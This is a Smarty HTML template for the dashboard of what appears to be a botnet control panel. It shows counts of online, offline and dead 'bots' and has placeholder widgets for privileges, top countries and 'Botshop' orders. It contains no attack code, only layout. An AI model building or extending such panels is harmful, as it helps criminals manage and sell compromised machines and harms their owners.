{include file="header.tpl"}
{include file="nav.tpl"}

<div class="page-header">
    <div class="container-fluid">
        <h2 class="h5 no-margin-bottom">Dashboard</h2>
    </div>
</div>

<section class="no-padding-top no-padding-bottom">
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-3 col-sm-6">
                <div class="statistic-block block">
                    <div class="progress-details d-flex align-items-end justify-content-between">
                        <div class="title">
                            <div class="icon"><i class="icon-user-1"></i></div><strong>Online Clients</strong>
                        </div>
                        <div class="number dashtext-1">{$onlinebotcount}</div>
                    </div>
                    <!--
                    <div class="progress progress-template">
                        <div role="progressbar" style="width: 30%" aria-valuenow="30" aria-valuemin="0" aria-valuemax="100" class="progress-bar progress-bar-template dashbg-1"></div>
                    </div>
                    -->
                </div>
            </div>
            <div class="col-md-3 col-sm-6">
                <div class="statistic-block block">
                    <div class="progress-details d-flex align-items-end justify-content-between">
                        <div class="title">
                            <div class="icon"><i class="icon-contract"></i></div><strong>Offline Clients</strong>
                        </div>
                        <div class="number dashtext-2">{$botcount - $onlinebotcount}</div>
                    </div>
                   <!--
                    <div class="progress progress-template">
                        <div role="progressbar" style="width: 70%" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100" class="progress-bar progress-bar-template dashbg-2"></div>
                    </div>
                    -->
                </div>
            </div>
            <div class="col-md-3 col-sm-6">
                <div class="statistic-block block">
                    <div class="progress-details d-flex align-items-end justify-content-between">
                        <div class="title">
                            <div class="icon"><i class="icon-paper-and-pencil"></i></div><strong>Dead Clients</strong>
                        </div>
                        <div class="number dashtext-3">{$deadbotcount}</div>
                    </div>
                    <!--
                    <div class="progress progress-template">
                        <div role="progressbar" style="width: 55%" aria-valuenow="55" aria-valuemin="0" aria-valuemax="100" class="progress-bar progress-bar-template dashbg-3"></div>
                    </div>
                    -->
                </div>
            </div>
            <div class="col-md-3 col-sm-6">
                <div class="statistic-block block">
                    <div class="progress-details d-flex align-items-end justify-content-between">
                        <div class="title">
                            <div class="icon"><i class="icon-writing-whiteboard"></i></div><strong>Total Clients</strong>
                        </div>
                        <div class="number dashtext-4">{$botcount}</div>
                    </div>
                    <!--
                    <div class="progress progress-template">
                        <div role="progressbar" style="width: 35%" aria-valuenow="35" aria-valuemin="0" aria-valuemax="100" class="progress-bar progress-bar-template dashbg-4"></div>
                    </div>
                    -->
                </div>
            </div>
        </div>


        <div class="row">
            <div class="col-lg-7 col-md-12 col-sm-12">
                map
            </div>
            <div class="col-lg-5 col-md-12 col-sm-12">
                stats
            </div>
        </div>


        <div class="row">
            <div class="col-lg-3 col-md-6 col-sm-12">
                Top Countrys
            </div>
            <div class="col-lg-3 col-md-6 col-sm-12">
                New Clients
            </div>
            <div class="col-lg-3 col-md-6 col-sm-12">
               Privileges
            </div>
            <div class="col-lg-3 col-md-6 col-sm-12">
                Last Botshop Orders
            </div>
        </div>

    </div>
</section>


{include file="footer.tpl"}
<!--
<script src="{$includeDir}assets/js/charts-home.js"></script>
-->
<script src="{$includeDir}assets/js/front.js"></script>